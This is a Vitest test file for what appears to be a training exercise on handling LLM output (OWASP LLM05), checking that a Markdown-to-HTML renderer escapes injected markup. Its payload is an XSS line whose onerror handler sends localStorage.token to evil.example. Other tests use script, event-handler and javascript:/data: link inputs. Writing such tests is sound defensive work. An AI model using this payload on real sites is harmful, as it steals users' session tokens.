import { describe, expect, it } from 'vitest';
import { pick, target } from '../pick.ts';
import * as exercise from './exercise.ts';
import * as solution from './solution.ts';
import * as vulnerable from './vulnerable.ts';

const { toHtml } = pick(exercise, solution);
const payload = `Summary ready. <img src=x onerror="fetch('https://evil.example/?t='+localStorage.token)">`;

describe(`06 output handling, LLM05 [${target}]`, () => {
  it('the vulnerable renderer hands the model raw HTML (the bug)', () => {
    expect(vulnerable.toHtml(payload)).toContain('<img src=x onerror=');
  });

  it('escapes tags, so injected markup renders as text', () => {
    const html = toHtml(payload);
    expect(html).not.toMatch(/<img/i);
    expect(html).toContain('&lt;img src=x onerror=&quot;');
  });

  it('escapes all five HTML special characters', () => {
    expect(toHtml(`& < > " '`)).toBe('&amp; &lt; &gt; &quot; &#39;');
  });

  it('kills <script> and event handlers', () => {
    expect(toHtml('<script>alert(1)</script>')).not.toMatch(/<script/i);
    expect(toHtml('<b onclick=alert(1)>x</b>')).not.toMatch(/<b /i);
  });

  it('still renders **bold** and https links', () => {
    expect(toHtml('**Approved**')).toBe('<strong>Approved</strong>');
    expect(toHtml('[docs](https://owasp.org/x)')).toBe(
      '<a href="https://owasp.org/x" rel="noopener noreferrer" target="_blank">docs</a>',
    );
  });

  it('refuses javascript: and data: links', () => {
    expect(toHtml('[click](javascript:alert(1))')).not.toContain('<a');
    expect(toHtml('[click](data:text/html,<script>alert(1)</script>)')).not.toContain('<a');
  });

  it('turns newlines into <br>', () => {
    expect(toHtml('a\nb')).toBe('a<br>b');
  });
});
